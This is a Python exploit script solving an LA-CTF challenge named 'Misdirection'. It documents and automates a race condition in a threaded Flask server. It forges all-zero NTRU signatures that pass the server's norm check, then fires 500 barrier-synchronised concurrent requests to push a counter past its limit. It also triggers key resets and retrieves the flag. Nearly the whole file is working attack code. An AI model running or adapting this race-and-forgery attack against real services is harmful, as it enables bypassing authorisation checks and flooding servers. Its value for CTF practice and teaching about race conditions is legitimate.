#!/usr/bin/env python3
"""
MISDIRECTION - LA-CTF Solution

VULNERABILITY: Race condition in threaded Flask app.

The /grow endpoint checks `current_count < 4` then verifies the signature.
With forged signatures (s=0), verification goes through NTRU.Verifying()
which calls star_multiply() - a pure Python O(N^2) loop taking ~60ms.
During this time, the GIL switches threads periodically. Multiple threads
can pass the `current_count < 4` check before any thread increments.

KEY INSIGHT: We MUST use FORGED signatures (not server-provided ones).
Server-provided signatures are in signature_cache and bypass verification
entirely (instant dict lookup), giving NO race window.

Forged s=0 signatures work because:
  NTRUNorm(s=0, 0*h - m, (0,q)) = NTRUNorm(0, -m mod q) ≈ 400 < 545
"""

import hashlib
import numpy as np
import requests
from Crypto.Util.number import long_to_bytes
import time
import sys
import concurrent.futures
import threading

N = 251
q = 128
N_BOUND = 545

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "https://misdirection-r8z6s.instancer.lac.tf"


def H(s: bytes, N: int):
    h = hashlib.sha1()
    i = 0
    m = ""
    while len(m) < N:
        h.update(s + str(i).encode("ascii"))
        m += h.hexdigest()
        i += 1
    coeff = np.zeros(N)
    for i in range(len(m)):
        coeff[i % N] += ord(m[i])
    return coeff


def centered_norm(coeff):
    c = np.array(coeff)
    return np.sqrt(np.sum(np.square(c)) - np.square(np.sum(c)) / len(c))


def find_valid_r(count: int, offset=0):
    msg = long_to_bytes(count)
    for r in range(offset, offset + 100000):
        m_coeff = H(msg + r.to_bytes(10, 'big'), N)
        m_mod_q = (-m_coeff) % q
        if centered_norm(m_mod_q) < N_BOUND:
            return r
    return offset


def forge_sig(r: int):
    sig = "-----BEGIN NTRU SIGNATURE BLOCK-----\n"
    sig += "|".join(["0"] * N)
    sig += f"\n=={r}"
    sig += "\n-----END NTRU SIGNATURE BLOCK-----\n"
    return sig


def wait_ready(session, max_wait=300):
    for _ in range(max_wait // 3):
        try:
            resp = session.get(f"{BASE_URL}/status", timeout=30)
            if resp.json().get("status"):
                return True
        except:
            pass
        time.sleep(3)
    return False


race_wins = 0
race_lock = threading.Lock()


def race_worker(url, count, sig, barrier, idx):
    """Race worker: pre-connects, waits at barrier, then fires."""
    global race_wins
    try:
        sess = requests.Session()
        # Pre-establish TLS connection
        sess.get(f"{url}/status", timeout=30)
        
        # Synchronize all threads
        barrier.wait(timeout=60)
        
        # Fire the grow request
        resp = sess.post(
            f"{url}/grow",
            json={"count": count, "sig": sig},
            timeout=300
        )
        result = resp.json()
        msg = result.get('msg', '')
        if "has grown" in msg:
            with race_lock:
                race_wins += 1
                print(f"    [Thread {idx}] SUCCESS: {msg} (total wins: {race_wins})")
            return True
        return False
    except Exception as e:
        return False


def main():
    global race_wins

    print("=" * 60)
    print("MISDIRECTION - Race Condition Exploit")
    print(f"Target: {BASE_URL}")
    print("=" * 60)

    session = requests.Session()

    for attempt in range(1, 11):
        print(f"\n{'='*60}")
        print(f"ATTEMPT {attempt}")
        print(f"{'='*60}")

        # Wait for server
        print("[*] Waiting for server...")
        if not wait_ready(session):
            print("[-] Server not responding")
            continue

        resp = session.get(f"{BASE_URL}/current-count", timeout=30)
        cc = resp.json()["count"]
        print(f"[*] Current count: {cc}")

        # Already enough?
        if cc >= 14:
            print("[+] Count >= 14, getting flag!")
            resp = session.post(f"{BASE_URL}/flag", timeout=30)
            print(f"FLAG: {resp.json().get('msg')}")
            return

        # Reset if stuck at >= 4
        if cc >= 4:
            print("[*] Resetting (regenerating keys, ~5 min)...")
            try:
                resp = session.get(f"{BASE_URL}/regenerate-keys", timeout=600)
                print(f"[*] {resp.json()}")
            except Exception as e:
                print(f"[*] Reset: {e}")
            time.sleep(5)
            if not wait_ready(session):
                continue
            resp = session.get(f"{BASE_URL}/current-count", timeout=30)
            cc = resp.json()["count"]
            print(f"[*] After reset, count: {cc}")

        # Get zero signature
        resp = session.get(f"{BASE_URL}/zero-signature", timeout=30)
        zero_sig = resp.json()["signature"]
        sigs = {0: zero_sig}

        # Grow to 3 normally
        while cc < 3:
            sig = sigs.get(cc)
            if not sig:
                r = find_valid_r(cc)
                sig = forge_sig(r)

            print(f"[*] Growing {cc} -> {cc+1}...")
            wait_ready(session)
            resp = session.post(
                f"{BASE_URL}/grow",
                json={"count": cc, "sig": sig},
                timeout=120
            )
            result = resp.json()
            print(f"    {result.get('msg', '')}")
            if result.get("signature") and result["signature"] != "null":
                sigs[result["count"]] = result["signature"]
            cc = result.get("count", cc)

        print(f"[*] Count = {cc}, preparing race...")

        # Pre-compute forged signatures with DIFFERENT r values
        # so NONE are in server's signature_cache.
        # Almost every r gives norm ~400 < 545, so just use r=10000+i
        print("[*] Computing forged signatures for count=3...")
        NUM = 500
        forged = [forge_sig(10000 + i) for i in range(NUM)]
        print(f"[*] Generated {NUM} unique forged signatures")

        wait_ready(session)

        # Race attack!
        print(f"\n[*] FIRING {NUM} concurrent requests...")
        race_wins = 0
        barrier = threading.Barrier(NUM, timeout=120)

        with concurrent.futures.ThreadPoolExecutor(max_workers=NUM) as pool:
            futs = [
                pool.submit(race_worker, BASE_URL, 3, forged[i], barrier, i)
                for i in range(NUM)
            ]
            concurrent.futures.wait(futs, timeout=600)

        print(f"\n[*] Total successful grows: {race_wins}")

        # Wait for server to stabilize
        print("[*] Waiting for server to settle...")
        time.sleep(15)
        for _ in range(60):
            try:
                resp = session.get(f"{BASE_URL}/status", timeout=30)
                if resp.json().get("status"):
                    break
            except:
                pass
            time.sleep(5)

        resp = session.get(f"{BASE_URL}/current-count", timeout=30)
        cc = resp.json()["count"]
        print(f"[*] Count after race: {cc}")

        if cc >= 14:
            print("\n[+] SUCCESS!")
            resp = session.post(f"{BASE_URL}/flag", timeout=30)
            result = resp.json()
            print(f"{'='*60}")
            print(f"FLAG: {result.get('msg')}")
            print(f"{'='*60}")
            return
        elif cc > 4:
            print(f"[*] Partial success: {cc - 3} threads raced through")
        else:
            print(f"[-] Race failed, only 1 thread got through")
        print("[*] Will reset and retry...")

    print("\n[-] Exhausted attempts. Try again or increase NUM.")


if __name__ == "__main__":
    main()
